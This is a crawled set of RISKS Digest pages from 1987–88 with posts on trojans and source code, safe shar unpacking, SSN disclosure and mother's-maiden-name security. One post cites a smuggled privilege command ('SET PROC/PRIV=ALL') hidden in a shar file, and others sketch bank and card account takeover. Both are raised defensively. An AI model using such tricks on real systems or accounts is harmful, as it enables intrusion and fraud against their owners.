<LI><A HREF="/Risks/7.91.html#subj1">  More on Proper British Programs (Nancy Leveson)</A>
<LI><A HREF="/Risks/7.91.html#subj2">  Re: Vendor Liability, and "Plain Vanilla" configurations (Jay Elinsky)</A>
<LI><A HREF="/Risks/7.91.html#subj3">  Manufacturers' Responsibilities for Security (Lynn R Grant)</A>
<LI><A HREF="/Risks/7.91.html#subj4">  Hacker enters U.S. lab's computers (George Wood via Werner Uhrig)</A>
<LI><A HREF="/Risks/7.91.html#subj5">  Computer Virus Eradication Act of 1988 (Don Alvarez, from VIRUS-L)</A>
<LI><A HREF="/Risks/7.91.html#subj6">  They did it: Speed-Thru Tollbooths (Robert Steven Glickstein)</A>
<LI><A HREF="/Risks/7.91.html#subj7">  Re: Toll Road information collection    (Brint Cooper, Scott E. Preece, John Sullivan)
</A>
<LI><A HREF="/Risks/7.91.html#subj8">  Re: Subways that "know" who's on board (Chris Hibbert)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.92.html">Volume 7 Issue 92 (12 Dec 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.92.html#subj1">  Glass cockpits (Randall Davis)</A>
<LI><A HREF="/Risks/7.92.html#subj2">  "Proper British Programs" (Steve Philipson)</A>
<LI><A HREF="/Risks/7.92.html#subj3">  Information available for a price (Curtis Keller and Bruce O'Neel)</A>
<LI><A HREF="/Risks/7.92.html#subj4">  Toll Road information collection (Steve Philipson)</A>
<LI><A HREF="/Risks/7.92.html#subj5">  Big Bother and Computer Risks (Dennis L. Mumaugh)</A>
<LI><A HREF="/Risks/7.92.html#subj6">  Re: Computer Virus Eradication Act of 1988 (Jonathan Sweedler, Vince Manis)</A>
<LI><A HREF="/Risks/7.92.html#subj7">  Re: Vendor Liability and "Plain Vanilla" configurations (Andy Goldstein)</A>
<LI><A HREF="/Risks/7.92.html#subj8">  Re: "Hackers", "crackers", "snackers", and ethics (Andy Goldstein)</A>
<LI><A HREF="/Risks/7.92.html#subj9">  Hackers (Shatter)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.93.html">Volume 7 Issue 93 (13 Dec 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.93.html#subj1">  Overrides of train controls in Japan (Jeff Schriebman)</A>
<LI><A HREF="/Risks/7.93.html#subj2">  Re: Vincennes and over-reliance on automation (Victor Riley)</A>
<LI><A HREF="/Risks/7.93.html#subj3">  Fake ATMs (Rick Adams) </A>
<LI><A HREF="/Risks/7.93.html#subj4">  `Trapdoor' -- War by Computer Virus (Rodney Hoffman)</A>
<LI><A HREF="/Risks/7.93.html#subj5">  Re: "Hackers", "crackers", "snackers", and ethics (Douglas Jones)</A>
<LI><A HREF="/Risks/7.93.html#subj6">  Hacking the etymology (Nigel Roberts)</A>
<LI><A HREF="/Risks/7.93.html#subj7">  Re: design intent of worm (Rich Thomson)</A>
<LI><A HREF="/Risks/7.93.html#subj8">  It's NOT a computer! (Martin Minow)</A>
<LI><A HREF="/Risks/7.93.html#subj9">  There's no excuse (Aaron Harber via Martin Minow)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.94.html">Volume 7 Issue 94 (15 Dec 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.94.html#subj1">  Vincennes:  conclusively, a computer-related error (Clifford Johnson)</A>
<LI><A HREF="/Risks/7.94.html#subj2">  Ethics (Dennis G. Rears)</A>
<LI><A HREF="/Risks/7.94.html#subj3">  "It's already in the computer" (David Sherman)</A>
<LI><A HREF="/Risks/7.94.html#subj4">  RISKS of Tightening Security (F.Baube)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.95.html">Volume 7 Issue 95 (16 Dec 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.95.html#subj1">  Armed with a keyboard and considered dangerous (Rodney Hoffman)</A>
<LI><A HREF="/Risks/7.95.html#subj2">  Value for money? (Part 2) (Jerry Harper)</A>
<LI><A HREF="/Risks/7.95.html#subj3">  USAF software contractors score poorly (Henry Spencer)</A>
<LI><A HREF="/Risks/7.95.html#subj4">  Reasoning about software (Nancy Leveson)</A>
<LI><A HREF="/Risks/7.95.html#subj5">  Hacking the etymology (Nigel Roberts)</A>
<LI><A HREF="/Risks/7.95.html#subj6">  [Shattering revelations] (Shatter)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.96.html">Volume 7 Issue 96 (20 Dec 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.96.html#subj1">  Soviets Claim Computer-Virus Shield (PGN)</A>
<LI><A HREF="/Risks/7.96.html#subj2">  UNICEF Belated Greetings (David Andrew Segal and Chris Koenigsberg)</A>
<LI><A HREF="/Risks/7.96.html#subj3">  Computer Ethics or just Ethics (David Clayton)</A>
<LI><A HREF="/Risks/7.96.html#subj4">  Those Who Do Not Learn From History (F. Baube)</A>
<LI><A HREF="/Risks/7.96.html#subj5">  Re: Armed with a keyboard and considered dangerous (F. Baube)</A>
<LI><A HREF="/Risks/7.96.html#subj6">  Re: Computer Virus Eradication Act of 1988 (David Keegel)</A>
<LI><A HREF="/Risks/7.96.html#subj7">  Manslaughter caused by computer error (Herman J. Woltring)</A>
<LI><A HREF="/Risks/7.96.html#subj8">  New EMI Shielding Material (Earl Boebert)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.97.html">Volume 7 Issue 97 (21 Dec 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.97.html#subj1">  Software Safety report in UK (Jane Hesketh via Philip Wadler)</A>
<LI><A HREF="/Risks/7.97.html#subj2">  Over-reliance on a single source of data (Cory Kempf)</A>
<LI><A HREF="/Risks/7.97.html#subj3">  Computers vs Scandanavian Design (Bob Frankston)</A>
<LI><A HREF="/Risks/7.97.html#subj4">  Supercomputer used to "solve" math problem (Henry Cox)</A>
<LI><A HREF="/Risks/7.97.html#subj5">  Re: Armed with a keyboard and considered dangerous (Dan Franklin)</A>
<LI><A HREF="/Risks/7.97.html#subj6">  Another article on the dangerous keyboard artist (Jerry Leichter)</A>
<LI><A HREF="/Risks/7.97.html#subj7">  Virus article debunked (Stephen Page)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.98.html">Volume 7 Issue 98 (22 Dec 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.98.html#subj1">  The Fetzer Paper in CACM (Brian Randell)</A>
<LI><A HREF="/Risks/7.98.html#subj2">  Computers in mathematical proof (Dale Worley)</A>
<LI><A HREF="/Risks/7.98.html#subj3">  Teaching students about responsible use of computers (Jerome H. Saltzer)</A>
<LI><A HREF="/Risks/7.98.html#subj4">  Responsible use of computers (PGN)</A>
</UL></DL>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6/index.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Volume" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8/index.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Volume" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-38</DOCNO>
<DOCOLDNO>IA012-000130-B023-157</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.2.html 128.240.150.127 19970217014907 text/html 18561
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:47:32 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 2</TITLE>
<LINK REL="Prev" HREF="/Risks/6.01.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.03.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.01.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.03.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 2</H1>
<H2> Monday, 4 January 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Source Code is Counter to Viruses &amp; Trojan Horses 
</A>
<DD>
<A HREF="#subj1.1">
Hal Guthery
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Viral VAXination? 
</A>
<DD>
<A HREF="#subj2.1">
Bryce Nesbitt
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Who is entitled to privacy? 
</A>
<DD>
<A HREF="#subj3.1">
Andy Freeman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  SSN / Passport / IRS ... 
</A>
<DD>
<A HREF="#subj4.1">
Joe Morris
</A><br>
<A HREF="#subj4.2">
 Don Wegeng
</A><br>
<A HREF="#subj4.3">
 Jean Marie Diaz
</A><br>
<A HREF="#subj4.4">
     Martin Minow
</A><br>
<A HREF="#subj4.5">
 Brint Cooper
</A><br>
<A HREF="#subj4.6">
 EAE114
</A><br>
<A HREF="#subj4.7">
 John Pershing
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Source Code is Counter to Viruses &amp; Trojan Horses
</A>
</H3>
<address>
"guthery%asc@sdr.slb.com" 
&lt;<A HREF="mailto:GUTHERY%ASC%sdr.slb.com@RELAY.CS.NET">
GUTHERY%ASC%sdr.slb.com@RELAY.CS.NET
</A>&gt;
</address>
<i>
Mon, 4 Jan 88 07:51 EDT
</i><PRE>
To: risks@csl.sri.com

As a little bit of reflection about the fact that almost all computers have
clocks in them will show, there is no protection in trying programs out with 
write-only harddisks or with privileges turned off.  Doing this only sets
the hook deeper.  In fact, anytime you run a program whose complete 
workings you do not and cannot understand you are at the mercy of the author
of the program and you are at risk.

One very good way to counter viruses and trojan horses is to insist on getting
the source code of any program you run.  This is summarized in the following 
pocketsize adage:

		     IF YOU CAN'T READ IT, DON'T RUN IT

There are NO good reasons why software vendors shouldn't give you the source
code of any program they sell you.  The reason they don't currently is because
you could see what a mess the program really is.  In 999 cases out of 1,000
they don't know everything the program does and they certainly don't want you
looking over the code and telling them.

For a moment stop and think of all the execute only software you run on
your system.  Think of all the companies from whom you purchased this
software.  Think of all the pressure you put on them for bug fixes, new
features, and lower prices.  Think about the translation of these pressures
into pressures on programmers.  Suppose one of these programmers decides to
get just a little even ...  an occassional bad number, a lost record once a 
month, a couple pennies moved from here to there just for fun, a scrambled
directory entry once in a blue moon.  If the program does what it purports 
to do, where is the check?  The project leader?  The manager?  The president?
The venture capitalist?  You?  And who is responsible?  You!  And what can 
you do with a bunch of object code?  Turn off the harddisk?  Scan the program
for strings?  Deny privileges?  Piece of cake!

We are marginally able to answer the question "Does this piece of software
do what I want it to do?" but we are absolutely incapable of answering
the much more important question "Does this piece of software NOT do what 
I don't want it to do?"  Through this gaping hole in our capabilities enter 
viruses and trojan horses.  It is historically interesting that I can get a 
handle on the first question without the source code but I can get nowhere 
on the second without it.  As long as we willing to accept programs from 
software suppliers without the source code we, irresponsibly in my view, 
accept undue risk and invite disaster.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Viral VAXination? (Re: RISKS-6.1)
</A>
</H3>
<address>
Bryce Nesbitt
&lt;<A HREF="mailto:bryce%hoser.Berkeley.EDU@ucbvax.Berkeley.EDU ">
bryce%hoser.Berkeley.EDU@ucbvax.Berkeley.EDU 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 4 Jan 88 07:52:09 GMT
Organization: The Logic Foundation

&gt;      (Martin Minow THUNDR::MINOW ML3-5/U26 223-9922)  writes:
&gt;
&gt;Could a "harmless"  CHRISTMA-like virus attack a VAX/VMS system?   A
&gt;recent network posting (RISKS?, LINKFAIL?) mentioned the possibility of a
&gt;virus  hidden in SHAR files which are _executed_ as .COM  files to unpack
&gt;them.

I'm surprised nobody has mentioned this:  Around here we don't "execute"
shar files to unpack them.  Instead there is a handly little utility called
"unshar".  I use a version on both Unix and my Amiga microcomputer.  It
internally handles all of the "legitimate" commands that a simple file packing
shar might contain (echo, wc, cat, if, test, #, exit, etc.).

It is much less vulnerable to attack.  To use the example of the poster, unshar
would simple report "unknow command" if a "SET PROC/PRIV=ALL" was quietly 
inserted in the middle of the file.

The comp.sources.unix and comp.sources.misc archives undoubtably have C
source code for the taking.

bryce@hoser.berkeley.EDU -or- ucbvax!hoser!bryce (or try "cogsci")

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Who is entitled to privacy?
</A>
</H3>
<address>
Andy Freeman 
&lt;<A HREF="mailto:ANDY@Sushi.Stanford.EDU">
ANDY@Sushi.Stanford.EDU
</A>&gt;
</address>
<i>
Thu 31 Dec 87 14:36:48-PST
</i><PRE>
To: risks@csl.sri.com

[BTW - What happens if I send mail to risks-list@kl.sri.com?]

The recent controversy over access to financial records of companies
(the companies want to control it and some find this offensive) is
somewhat similar to the continuing furor over records about people,
except that popular opinion in the latter case is that the people
should be able to control information about themselves.

Is there an essential difference here and what is it?  Is the corner
gas station entitled to more privacy than IBM?  Why?  Are all the
corner gas stations entitled to more privacy than IBM?  (The former
group is comparable in size to IBM.)

Note that in the current case, companies collected the information
about themselves while in most privacy invasion cases, the person
doesn't collect the information.  If one is going to argue on property
rights alone, these companies are entitled to control access while
people in the other case aren't.
                                            -andy

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
SSN Required Disclosures
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Mon, 04 Jan 88 16:27:05 EST
From: Joe Morris (jcmorris@mitre.arpa) &lt;jcmorris@mitre.arpa&gt;

In RISKS 6:1, David Albert reports that a post office clerk claims that the
disclosure of your SSN is no longer "optional" on the passport applications.
I can't say whether or not it is required, but the clerk is out of line in
any case.  The law on disclosure requirements is unusally direct:

  o The law prohibits any Federal, State, or local government entity
    (supposedly including related entities like State-suppported 
    universities) from denying any benefit or service because you
    didn't give your SSN, with certain specified exceptions.  These
    exceptions  are generally (a) where tax matters are involved; 
    (b) for a driver's license, and (c) in  certain cases where there
    was a pre-existing *legislative* requirement for the SSN.

  o Whenever a governmental organization requests the SSN, whether it is
    required or optional, you *must* be given what is called the "Privacy
    Act Notification".  This must tell you:

      (a) whether the request for the SSN is mandatory or optional;
      (b) what will happen if you don't give it;
      (c) under what authority it is being requested; and
      (d) what will be done with the information being requested.

    The Federal income tax forms you just received last week contain
    a good example of a well-constructed, complete Privacy Act Notification.
    (I knew that the IRS had to be good for something!)

  o There are no restrictions placed on the private sector governing the
    request for your SSN.

In other words, the passport application should have included a Privacy Act
notification, regardless of whether the SSN was optional or required.

After writing the above, I called the Department of State to see what they
had to offer.  According to the Passport Office, the SSN *is* required, as
of this morning (1/4/88); supposedly the Privacy Act Notification is on the
back of the application.  The DoS staffer I talked to insisted that
applications prior to today didn't require the SSN to be provided.

I assume that an application without the SSN would merely be returned; I
can't see them fining you for not completing the form.

Incidentally, does anyone in NetLand know of any case law covering the
SSN requests?  In particular, I'm interested in whether there have been
any cases involving state universities.  Although I wasn't involved, a  
friend was told by the legal office of his state university employer that
the law didn't apply to educational institutions, even if they were
funded by the state.  On the other hand, seeing how poorly the legislature
funded that university, maybe the lawyer had a point...
                                                            Joe Morris

</PRE>
<HR><H3><A NAME="subj4.2">
Re: SSN Required Disclosures
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
4 Jan 88 18:37:09 EST (Monday)
</i><PRE>
To: RISKS@KL.SRI.COM
From: Don Wegeng &lt;Wegeng.Henr@Xerox.COM&gt;

I saw a short article on this subject last week in one of the Rochester, NY
newspapers (I can probably find it at home if anyone wants a more specific
reference). As I recall, the article stated that the IRS is having problems
tracking down American citizens living abroad who don't file income tax
returns, so a law was passed which requires passport applicants to give
their SSN. The article didn't mention a fine, but stated that until new
application forms are available applicants who do not give their SSN will
probably be contacted for this information by the IRS.

It appears that the IRS and the INS are going to start sharing information,
undoubtably by connecting their computers in some way. The potential RISKS
in this have been discussed in this forum many times.
                                                              /Don

     [Also noted by Roy Maxion.  The following messages, for those of you who
     haven't already given up on RISKS-6.2, relate further to this topic.  This
     is a very popular subject, and it keeps flaring up spontaneously in RISKS.
     Thus I tend to be tolerant for a while, but then &lt;once again&gt; wish to slow
     it down.  The following flurry of messages is an effort in that direction 
     rather than an encouragement to stimulate it further.  PGN]

</PRE>
<HR><H3><A NAME="subj4.3">
Re: mother's maiden name
</A>
</H3>
<address>
Jean Marie Diaz 
&lt;<A HREF="mailto:ambar@ATHENA.MIT.EDU">
ambar@ATHENA.MIT.EDU
</A>&gt;
</address>
<i>
Sun, 3 Jan 88 04:04:11 EST
</i><PRE>
Reply-To: ambar@athena.mit.edu
Usnail: 55 Grove St., Somerville, MA  02144
Nynex: (617) 623-6591

Funny, I was opening a checking account today, and noticed that question
for the first time.  When I asked why they asked, I was told that it was
wanted "in case the bank wanted to verify who I was".  (In case of an
accident that cripples my writing hand?  Well, maybe...)

On a related note, someone can call BayBanks and make various inquiries
about my account, and even change the address to which my statements are
mailed, by knowing my account number and the amount &amp; date of my last
deposit.  Sounds tricky enough?  Not for those of us who use Direct
Deposit to handle our paychecks...
                    				AMBAR

</PRE>
<HR><H3><A NAME="subj4.4">
Mother's maiden name?
</A>
</H3>
<address>
&lt;<A HREF="mailto:minow%thundr.DEC@decwrl.dec.com ">
minow%thundr.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
3 Jan 88 11:47
</i><PRE>

Why does American Express want to know your mother's maiden name?
When my pocket was picked two years ago, and my AmEx card, passport,
cash, and travellers checks stolen, AmEx (Paris) asked the obvious
questions plus my mother's maiden name.  As I understand it, it's
something you generally know, but the thief (who has your name, address,
phone number, SSnumber, and a lot of other information) probably doesn't
know.  AmEx (or whoever) is assuming the risk of giving a new card out
to an unknown person who might not have *any* identification at all,
and they evidently feel that this simple "password" is an authenticator
with a reasonable level of risk.

Incidently, AmEx lived up to its advertisements.  The U.S. embassy in Paris
managed to get me a replacement passport at 1 pm on a Saturday even though I
had absolutely no identification.  The embassy officer even lent me $10 so I
could take a photo and metro to my luggage (and money stash).  If I remember
correctly, they did ask for a mother's maiden name (or similar).
                                                                     Martin

</PRE>
<HR><H3><A NAME="subj4.5">
 [Henry Mensch: American Express security ...]
</A>
</H3>
<address>
Brint Cooper 
&lt;<A HREF="mailto:abc@BRL.ARPA">
abc@BRL.ARPA
</A>&gt;
</address>
<i>
Sun, 3 Jan 88 13:12:06 EST
</i><PRE>

    [Coincidentally, Steve Anthony &lt;Anthony@ALDERAAN.SCRC.Symbolics.COM&gt;
    asked Why are Mother's Maiden Names Required?  PGN]

In registering patients for the first time, the Johns Hopkins Hospital
in Baltimore asks for Mother's maiden name as well.  This and other
information is factored into an algorithm for assigning a patient
identification number.  The hope is that by using such information, the
probability of two patients being assigned the same number is acceptably low.

Why not just assign numbers sequentially?  Inevitably, someone loses
their plate.  JHH wants to be able to retrieve their records by
reconstructing the number, if necessary.  Assigning a second number
would mean that the patient has two incomplete sets of medical records
in the hospital.  Some physicians would know the old number, others the
new.  Imagine what a malpractice lawyer would do with that!

</PRE>
<HR><H3><A NAME="subj4.6">
AM/EX AND MAIDEN NAMES
</A>
</H3>
<address>
&lt;<A HREF="mailto:EAE114%URIMVS.BITNET@CUNYVM.CUNY.EDU">
EAE114%URIMVS.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Mon, 04 Jan 88 10:07 EST
</i><PRE>

When you're filling out the forms, it helps if you remember that the
MOTHER's MAIDEN NAME is essentially a password.  
          [and therefore subject to all of the problems of passwords...  PGN]
There is no particular reason why you have tell the truth, as long as you
remember what you DID say.

</PRE>
<HR><H3><A NAME="subj4.7">
  American Express security ...
</A>
</H3>
<address>
John Pershing 
&lt;<A HREF="mailto:PERSHNG@ibm.com">
PERSHNG@ibm.com
</A>&gt;
</address>
<i>
4 Jan 88 08:49:17 EST
</i><PRE>

    From: Henry Mensch &lt;henry@garp.mit.edu&gt;
    Does this mean that anyone who knows a bit about me can get my AmEx
    plate, too?

No, it merely means that anyone who knows a bit about you can get a new
AmEx card mailed to your house.  (Of course, there's nothing preventing
someone who knows your card number from sending AmEx a change of address
notification, and then requesting a new card!  However, this might raise
some eyebrows over at AmEx...)

Remember, too, that AmEx is liable for any fraud that is perpetrated in this
way.  They are taking a calculated risk -- trying to make life as painless
as possible for their cardholders while maintaining a sensible amount of
security.  It has always seemed to me that AmEx strikes an extremely
reasonable balance in this respect.
                                     John A. Pershing Jr., IBM Yorktown Heights

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.01.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.03.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-39</DOCNO>
<DOCOLDNO>IA012-000130-B023-183</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.3.html 128.240.150.127 19970217014922 text/html 29331
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:47:48 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 3</TITLE>
<LINK REL="Prev" HREF="/Risks/6.02.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.04.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.02.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.04.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 3</H1>
<H2> Tuesday, 5 January 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Ham radios and non-ionizing radiation 
</A>
<DD>
<A HREF="#subj1.1">
Eric Townsend
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Date formats 
</A>
<DD>
<A HREF="#subj2.1">
Geoff Lane
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Risks of Not Using Social Security Numbers 
</A>
<DD>
<A HREF="#subj3.1">
Bruce Baker
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Source code not a defense 
</A>
<DD>
<A HREF="#subj4.1">
TMPLee
</A><br>
<A HREF="#subj4.2">
 Chris Torek
</A><br>
<A HREF="#subj4.3">
 William Smith
</A><br>
<A HREF="#subj4.4">
     Tom Lane
</A><br>
<A HREF="#subj4.5">
 Don Chiasson
</A><br>
<A HREF="#subj4.6">
 Jeffrey R Kell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Unshar program 
</A>
<DD>
<A HREF="#subj5.1">
Brent L. Woods
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Ham radios and non-ionizing radiation
</A>
</H3>
<address>
eric townsend
&lt;<A HREF="mailto:flatline!erict@uunet.UU.NET ">
flatline!erict@uunet.UU.NET 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 4 Jan 88 03:37:47 GMT

  Amateur Radios Deadly?  Operators' cancer deaths evaluated
  
  TACOMA, Wash. (AP) -- Amateur radio operators in two states appear to die at
  abnormally high rates from several forms of cancer, suggesting a possible
  link between cancer and electromagnetic fields, according to data collected
  by a state epidemiologist.  Others cautioned that evidence has been
  inconsistent and that other factors may be involved.
  
  Dr. Samuel Milham Jr. of the Washington Department of Social and Health
  Services studied the deaths of 2,485 Washington and California ham operators
  between 1979 and 1984.  He reported in the American Journal of Epidemiology
  that 29 leukemia deaths would be expected in a group of people that size,
  but he found 36 deaths.  Statistically, the expected to find 72 lymphatic
  and blood-forming organ cancers, but found 89.  And he expected to find 67.6
  deaths from prostate cancer, but found 78.  The study "indicates that
  amateur radio operator licensees in Washington state and California state
  have significant excess mortality due to acute myloid leukemia, multiple
  myeloma nd perhaps certain types of malignant lymphoma," Milham reported.
  
  University of Colorado and Universtiy of North Carolina studies also have
  found unusually high levels of leukemia among children who live near power
  lines, he said.
  
  Dr. Noreen Harris, a Tacoma-Pierce County Health Department epidemiologist,
  questioned the data, "People living near power lines may be poor and other
  (cancer-causing) things may be in their environment," she noted.  
  
Some notes and questions I have:

1.  I remember reading in Omni or some other pseudo-science mag last
    year an article about the ill-effects of low-level ionizing
    radiation produced by things like 110VAC wires running through
    homes.  The individuals preforming the study were being lauded by
    most other 'serious' scientists.  Anybody else recall this?
2.  I feel Dr. Harris's remarks were very weak, especially since she's
    questioning someone else's not-so-accurate-data. "People living
    near power lines may be poor.."  We *all* live near power lines,
    that's how the stuff gets to our house! =:-&gt;.
3.  I realise that ham radio gear is not always shielded properly, etc,
    but how safe are we hackers from the stuff our 'puters put out?  I
    sat in front of a Commodore 64 and a TRS-80 Model I, Lv II for a total
    of 8 years, before, during, and after puberty. (TRS-80 at 9 years old!)
    What are the effects of high-level non-ionizing rad. on someone in
    the developmental stages of life, I ask.

J. Eric Townsend -&gt;uunet!nuchat!flatline!erict smail:511Parker#2,Hstn,Tx,77007

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
